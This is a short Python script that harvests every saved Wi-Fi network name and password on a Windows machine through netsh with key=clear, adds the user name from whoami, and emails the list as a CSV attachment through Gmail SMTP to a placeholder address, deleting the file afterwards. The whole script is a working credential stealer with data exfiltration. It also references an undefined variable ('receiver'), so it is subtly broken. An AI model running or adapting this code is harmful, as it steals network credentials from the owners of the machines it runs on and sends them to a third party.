import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from datetime import datetime

def whoami():
    computer_name = os.popen("whoami").read()
    return computer_name

def get_uid():
    now = datetime.now()
    dt_string = now.strftime("%d%m%Y%H%M%S")
    return dt_string
  
def extract_password(ssid):
    command_pass = f"netsh wlan show profile \"{ssid}\" key=clear"
    t = os.popen(command_pass).read()
    p = t.split("\n")
    # print(p)
    filtered = []
    for x in p:
        if len(x)!=0:
            filtered.append(x.strip())
    
    for x in filtered:
        if "Key" in x.split():
            password = x.split(":")[-1].strip()
            return password

def get_wifi_details():
    command_for_extracting_all_ssid = "netsh wlan show profile"
    t = os.popen(command_for_extracting_all_ssid).read()
    l = []
    for x in t.split("\n"):
        l.append(x.strip())
    
    only_ssid = l[9:]
    ssids = []
    for x in only_ssid:
        k = x.split(":")
        ssids.append(k[-1].strip())
    
    filtered_ssids = []
    for x in ssids:
        if len(x) != 0:
            filtered_ssids.append(x)
    content = "WIFI Name,Password\n"
    for x in filtered_ssids:
        if extract_password(x) is None:
            password = "High Secure"
        elif extract_password(x) == "1":
            password = "No password"
        else:
            password = extract_password(x)
        content = content + x + "," + str(password) + "\n"
    wifi_details = open("wifi_details.csv", "w")
    wifi_details.write(content)
    wifi_details.close()
    
    
def send_email(username, password, receiver_email, text):
    get_wifi_details()
    fromaddr = username
    toaddr = receiver
    msg = MIMEMultipart()
    msg['From'] = username
    msg['To'] = toaddr
    msg['Subject'] = f"WIFIDETAILS_{get_uid()}"
    body = text
    msg.attach(MIMEText(body, 'plain'))
    filename = "wifi_details.csv"
    attachment = open("./wifi_details.csv", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
    attachment.close()
    os.remove("wifi_details.csv")
        

username = "senderemail@gmail.com"
password = "*********"
receiver_email = "youremail@gmail.com"
text = f"Computer name : {whoami()}\n\n"
send_email(username, password, receiver_email, text)